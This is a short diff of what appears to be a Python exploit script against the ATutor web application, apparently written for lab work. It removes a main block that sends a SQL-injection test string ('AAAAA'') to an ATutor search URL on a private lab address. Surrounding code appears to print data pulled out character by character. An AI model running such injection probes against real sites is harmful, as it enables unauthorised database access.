@@ -95,7 +95,3 @@ def extractVersion(ip, type='mysql', noSpaces=True):
         sys.stdout.write(extracted_char)
         sys.stdout.flush()
     print("\n(+) Done!")
-
-if __name__ == "__main__":
-    recon.format_text("Hello", "hwllo")
-    execText("http://192.168.162.103/ATutor/mods/_standard/social/index_public.php?q=", "AAAAA'")
